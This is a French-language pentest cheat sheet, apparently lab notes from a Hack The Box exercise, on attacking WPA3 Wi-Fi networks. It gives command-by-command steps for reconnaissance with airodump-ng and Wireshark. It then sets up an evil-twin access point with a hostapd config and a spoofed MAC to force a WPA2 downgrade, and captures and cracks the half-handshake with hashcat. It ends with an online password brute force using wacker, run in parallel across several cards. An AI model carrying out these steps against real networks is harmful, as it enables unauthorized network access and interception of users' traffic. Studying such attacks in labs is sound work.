
[[#Recon]]
[[#Downgrade Attack]]
[[#Brute force en ligne]]

# Recon

1. Filtrer sur notre cible uniquement 

```shell
sudo airodump-ng -c <channel> --bssid <bssid> wlan0mon -w <output_file>
```


2. Attendre qu'un client se connecte (la PMF empêche la deauth donc obligé d'attendre) afin de capturer le handshake (celui ci n'est pas crackable)


3. Une fois le handshake capturé, vérifier sa validité avec cowpatty

```shell-session
cowpatty -c -r wpa3-01.cap
```

4. Ouvrir le fichier de capture avec Wireshark

```shell
sudo -E wireshark owe-01.cap
```

4. Filtrer sur la beacon frame

```
(wlan.fc.type == 0) && (wlan.fc.type_subtype == 0x08)
```

5. Dans `IEEE 802.11 Management → Tagged Parameters → RSN Information` -> `Auth Key Management` -> `RSN Capabilities` , verifier que la PMF est activée (Management Frame Protection Required = True). Si la PMF n'est pas activée, vulnérable à la deauth.

6. Identifier si le mode compatibilité est activé (RSN Information -> Auth Key Management -> PSK). S'il est activé on peut faire une "Downgrade Attack"



# Downgrade Attack

> [!Tip]
> Consiste à créer un evil twin et forcer les clients à s'authentifier auprès de nous en WPA2 afin de capturer le handshake et le cracker.


1. Créer le fichier de configuration hostapd.conf suivant

```config
# Interface and SSID Configuration
ssid=HTB-Secure
hw_mode=g
channel=1
interface=wlan1

#WPA2 AP Configuration
wpa=2
wpa_key_mgmt=WPA-PSK

#CCMP for RSN Pairwise Suite and Open System Authentication
rsn_pairwise=CCMP
auth_algs=1

#Fake Key to get half-handshake
wpa_passphrase=FAKEPASSWORD
```

Key parameters in the above configuration file include:

- `SSID`: Set to match the target AP
- `Channel`: Set to match the target AP
- `Authentication`: WPA2 (wpa_key_mgmt=WPA-PSK)
- `WPA Passphrase`: A placeholder such as FAKEPASSWORD (used to capture the half-handshake)

2. Spoofer l'adresse MAC de l'AP cible

```shell-session
sudo ifconfig wlan1 down
sudo macchanger -m D8:D6:3D:EB:29:D5 wlan1
sudo ifconfig wlan1 up
```

3. Lancer airodump pour préparer la capture du hadnshake. (ou tcpdump si on a qu'une carte WIFI )

```shell-session
sudo airodump-ng -c 1 --bssid D8:D6:3D:EB:29:D5 wlan0mon -w halfhandshake
```

```shell-session
sudo tcpdump -i wlan1 -w half-handshake.cap
```

4. Lancer notre rogue AP

```shell-session
hostapd hostapd.conf 
```


5. Si pas de PMF on peut faire de la deauth pour forcer un client à se connecter à nous, sinon on doit attendre.

Une fois un client connecté et le handshake capturé on doit avoir le message AP-STA-POSSIBLE-PSK-MISMATCH dans hostapd


6. Verifier que le handshake est valide

```shell-session
cowpatty -c -r halfhandshake-01.cap 
```

7. Convertir le fichier au format hashcat

```shell-session
hcxpcapngtool -o hash halfhandshake-01.cap
```


8. Cracker avec le mode 22000

```shell-session
hashcat -m 22000 --force hash /opt/wordlist.txt
```



# Brute force en ligne

Avec wacker
https://github.com/blunderbuss-wctf/wacker.git


#### 2.4G Wi-Fi Channel Frequencies

|Channel|Frequency|
|---|---|
|`1`|2412 MHz|
|`2`|2417 MHz|
|`3`|2422 MHz|
|`4`|2427 MHz|
|`5`|2432 MHz|
|`6`|2437 MHz|
|`7`|2442 MHz|
|`8`|2447 MHz|
|`9`|2452 MHz|
|`10`|2457 MHz|
|`11`|2462 MHz|
|`12`|2467 MHz|
|`13`|2472 MHz|
|`14`|2484 MHz|

lancer le bruteforce

```shell-session
sudo python3 wacker.py --interface wlan1 --wordlist /opt/wordlist.txt --ssid HackMe --freq 2412  --bssid D8:D6:3D:EB:29:D5
```


Si on a plusieurs cartes wifi, on peut les utiliser pour aller plus vite (tuojours avec wacker)

Exemple avec 2 cartes :

On split la wordlist en 2

```shell-session
 bash split.sh 2 /opt/wordlist.txt
```

On ouvre 2 terminaux et on lance 2 bruteforces en parallèle avec les 2 wordlists

```shell
sudo python3 wacker.py --interface wlan0 --wordlist wordlist.txt.aaa --ssid HackMe --freq <freq> --bssid D8:D6:3D:EA:27:D3


sudo python3 wacker.py --interface wlan1 --wordlist wordlist.txt.aab --ssid HackMe --freq <freq> --bssid D8:D6:3D:EA:27:D3
```